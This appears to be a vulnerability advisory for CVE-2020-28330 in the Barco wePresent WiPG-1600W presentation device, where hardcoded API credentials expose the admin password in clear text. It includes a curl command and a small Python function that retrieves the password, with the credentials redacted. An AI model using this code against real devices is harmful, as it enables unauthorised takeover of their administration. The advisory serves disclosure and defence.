1. Vulnerability Details

     Affected Vendor: Barco
     Affected Product: wePresent WiPG-1600W
     Affected Version: 2.5.1.8
     Platform: Embedded Linux
     CWE Classification: CWE-523: Unprotected Transport of Credentials
     CVE ID: CVE-2020-28330


2. Vulnerability Description

     An attacker armed with hardcoded API credentials from
     KL-001-2020-004 (CVE-2020-28329) can issue an authenticated
     query to display the admin password for the main web user
     interface listening on port 443/tcp.


3. Technical Description

     An authenticated request using the hardcoded credentials in
     KL-001-2020-004 (CVE-2020-28329) to https://<IP>:4001/w1.0
     will display the current admin password in clear text. An
     attacker will now have the admin password on the device, and
     can use the web interface to make any configuration changes
     to the device using the web UI.

     $ curl -k -u 'admin:[REDACTED]'

     The following is a basic Python function to return the admin password:
     
     def get_admin_pw(host, port, adminpw):
         apiuser = "admin"
         apipw = "[REDACTED]"
         url = "https://" + host + ":" + port + "/w1.0"
         response = requests.get(url, auth=HTTPBasicAuth(apiuser, apipw), verify=False, timeout=3)
         dict = response.json()
         adminpw = dict['data']['value']['DeviceInfo']['SystemPassword']
         return adminpw
